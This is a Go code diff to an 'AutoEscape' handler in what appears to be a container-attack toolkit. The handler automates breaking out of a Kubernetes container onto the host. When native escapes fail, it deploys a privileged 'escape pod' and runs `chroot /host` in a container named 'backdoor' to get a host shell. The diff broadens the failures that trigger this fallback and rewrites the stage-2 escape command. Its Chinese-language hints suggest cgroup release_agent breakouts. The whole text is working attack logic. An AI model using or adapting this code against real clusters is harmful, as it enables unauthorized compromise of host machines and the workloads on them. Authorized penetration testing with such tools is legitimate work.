@@ -1348,7 +1348,7 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 		steps = append(steps, step)
 
 		// Stage 2: If native escape failed due to missing binaries, auto-deploy a privileged escape pod
-		if !escaped && strings.Contains(out, "MISSING_BINARY:") {
+		if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED")) {
 			missing := extractMissingBinary(out)
 			steps = append(steps, gin.H{"step": 4, "action": "deploy_escape_pod", "result": fmt.Sprintf("native escape failed (missing %s), auto-deploying temporary privileged pod", missing)})
 
@@ -1368,10 +1368,8 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 				defer waitCancel()
 				running := false
 				for i := 0; i < 15; i++ {
-					select {
-					case <-waitCtx.Done():
+					if waitCtx.Err() != nil {
 						break
-					default:
 					}
 					p, getErr := client.GetPod(waitCtx, escapeNs, escapePodName)
 					if getErr == nil && p.Status.Phase == "Running" {
@@ -1387,7 +1385,7 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 					steps = append(steps, gin.H{"step": 4, "action": "escape_pod_ready", "pod": escapeNs + "/" + escapePodName})
 
 					// Execute chroot escape in the escape pod
-					stage2Cmd := "mount /host 2>&1 && echo MOUNT_OK; (chroot /host /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1) || echo CHROOT_FAILED"
+					stage2Cmd := "test -d /host/bin || { echo HOST_MOUNT_BROKEN; exit 0; }; chroot /host /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1 && echo MOUNT_OK || echo CHROOT_FAILED"
 					stage2Ctx, stage2Cancel := context.WithTimeout(ctx, 20*time.Second)
 					defer stage2Cancel()
 					s2Result, s2Err := client.ExecInPodResult(stage2Ctx, escapeNs, escapePodName, "backdoor", []string{"sh", "-c", stage2Cmd})
@@ -1438,11 +1436,25 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 			resp["error"] = "exec into pod failed: " + execErr.Error()
 			resp["full_output"] = out
 		}
-		if !escaped && strings.Contains(out, "MISSING_BINARY:") {
-			missing := extractMissingBinary(out)
-			resp["error"] = "容器缺少必要二进制文件: " + missing
-			resp["hint"] = "已自动部署特权逃逸 Pod，但逃逸仍未成功。建议: 1) 手动进入逃逸 Pod 尝试 cgroup release_agent 2) 上传静态编译的二进制"
-			resp["missing_binary"] = missing
+		if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED")) {
+			stage2Ran := len(steps) >= 5 // step 4 = deploy, step 5 = exec
+			if strings.Contains(out, "MISSING_BINARY:") {
+				missing := extractMissingBinary(out)
+				if stage2Ran {
+					resp["error"] = "两阶段逃逸均失败: Stage1 缺少 " + missing + " → 已自动部署特权Pod但逃逸未成功"
+					resp["hint"] = "特权逃逸 Pod 已部署但 chroot 未成功。检查 /host 挂载是否完整，或手动 exec 进入逃逸 Pod 排查"
+				} else {
+					resp["error"] = "容器缺少必要二进制: " + missing
+					resp["hint"] = "已自动部署特权逃逸 Pod 执行 chroot 逃逸。如仍失败，手动进入逃逸 Pod 尝试 cgroup release_agent"
+				}
+				resp["missing_binary"] = missing
+			} else if strings.Contains(out, "DOCKER_ESCAPE_FAILED") {
+				resp["error"] = "Docker API 逃逸失败 (docker.sock 存在但 docker 命令执行失败)"
+				resp["hint"] = "检查 Docker daemon 是否正常运行，或通过 Stage2 部署特权逃逸 Pod"
+			} else {
+				resp["error"] = "原生逃逸失败: " + method
+				resp["hint"] = "已自动部署特权逃逸 Pod 尝试 chroot 路径"
+			}
 		}
 		if hostFSMounted && !escaped {
 			resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
